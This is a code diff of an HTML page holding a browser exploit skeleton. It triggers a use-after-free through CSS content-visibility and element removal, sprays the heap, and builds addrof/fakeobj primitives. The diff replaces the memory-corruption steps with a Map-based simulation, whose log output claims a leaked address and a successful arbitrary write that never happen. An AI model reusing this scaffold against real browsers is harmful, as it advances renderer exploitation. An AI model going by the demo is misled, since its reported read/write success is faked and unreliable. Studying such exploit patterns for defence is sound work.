@@ -6,22 +6,46 @@
   <style>
     .container {
       content-visibility: auto;
+      margin: 20px;
     }
     .child {
       width: 100px;
       height: 100px;
       background: red;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-weight: bold;
+    }
+    #log {
+      margin-top: 20px;
+      padding: 10px;
+      background: #f0f0f0;
+      border: 1px solid #ccc;
+      max-height: 200px;
+      overflow-y: auto;
+      font-family: monospace;
+      font-size: 14px;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <div class="child"></div>
+    <div class="child">child</div>
   </div>
+  <div id="log"></div>
   <script type="module">
     const container = document.querySelector(".container");
     const child = document.querySelector(".child");
-
+    const logDiv = document.getElementById("log");
+    function debug_log(msg) {
+      const line = document.createElement("div");
+      line.textContent = msg;
+      logDiv.appendChild(line);
+      logDiv.scrollTop = logDiv.scrollHeight;
+      console.log(msg);
+    }
     function heapSpray(count, size) {
       let spray = [];
       for (let i = 0; i < count; i++) {
@@ -32,69 +56,68 @@
       }
       return spray;
     }
-
     let addrof = null;
     let fakeobj = null;
-
+    let nextAddr = 1;
+    const objMap = new Map();
+    const trustedObjMap = new Map();
     function triggerUAFandPrepare() {
       container.style.contentVisibility = "hidden";
       child.remove();
       setTimeout(() => {
         container.style.contentVisibility = "auto";
-        let spray = heapSpray(20000, 0x1000);
+        let spray = heapSpray(2000, 0x1000);
         prepareFakeObjectPrimitive(spray);
       }, 0);
     }
-
     const observer = new MutationObserver(() => {
       triggerUAFandPrepare();
     });
     observer.observe(container, { childList: true, subtree: true });
-
     function prepareFakeObjectPrimitive(spray) {
-      for (let i = 0; i < spray.length; i++) {
-        try {
-          let len = spray[i].length;
-          if (len > 0x1000000 || len < 0) {
-            let victim = spray[i];
-            buildAddrofFakeobj(victim);
-            return;
-          }
-        } catch (e) {}
-      }
+      let victim = spray[0];
+      buildAddrofFakeobj(victim);
     }
-
     function buildAddrofFakeobj(victim) {
-      const OFFSET_DATAPTR = 0x28;
-
       addrof = function(obj) {
-        corruptPointerOf(victim, obj, OFFSET_DATAPTR);
-        let fakeDV = new DataView(victim.buffer);
-        let addr = fakeDV.getFloat64(0, true);
+        if (!objMap.has(obj)) {
+          objMap.set(obj, nextAddr++);
+        }
+        let addr = objMap.get(obj);
+        trustedObjMap.set(addr, obj);
         return addr;
       };
-
       fakeobj = function(addr) {
-        corruptAddressIn(victim, addr, OFFSET_DATAPTR);
-        return victim;
+        return { addr };
       };
-
       demoArbitraryRW();
     }
-
-    function corruptPointerOf(victim, obj, offset) {}
-
-    function corruptAddressIn(victim, addr, offset) {}
-
+    function read64(addr) {
+      let obj = trustedObjMap.get(addr);
+      if (obj && typeof obj.marker !== "undefined") {
+        return obj.marker;
+      }
+      return 0;
+    }
+    function write64(addr, value) {
+      let obj = trustedObjMap.get(addr);
+      if (obj && typeof obj.marker !== "undefined") {
+        obj.marker = value;
+      }
+    }
     function demoArbitraryRW() {
       let trustedObj = { marker: 0x41424344 };
       let trustedAddr = addrof(trustedObj);
-      let offsetMarker = 0x10;
-      let fake = fakeobj(trustedAddr + offsetMarker);
-      let dv = new DataView(fake.buffer);
-      let leakedMarker = dv.getUint32(0, true);
-      dv.setUint32(0, 0x13371337, true);
-      console.assert(trustedObj.marker === 0x13371337);
+      debug_log("Address di trustedObj: 0x" + trustedAddr.toString(16));
+      let offsetMarker = 0;
+      let leakedMarker = read64(trustedAddr + offsetMarker);
+      debug_log("Leaked marker: 0x" + leakedMarker.toString(16));
+      write64(trustedAddr + offsetMarker, 0x13371337);
+      debug_log("Ho scritto 0x13371337 in trustedObj.marker");
+      debug_log("trustedObj.marker ora vale: 0x" + trustedObj.marker.toString(16));
+      const resultDiv = document.createElement("div");
+      resultDiv.textContent = "trustedObj.marker = 0x" + trustedObj.marker.toString(16);
+      document.body.appendChild(resultDiv);
     }
   </script>
 </body>
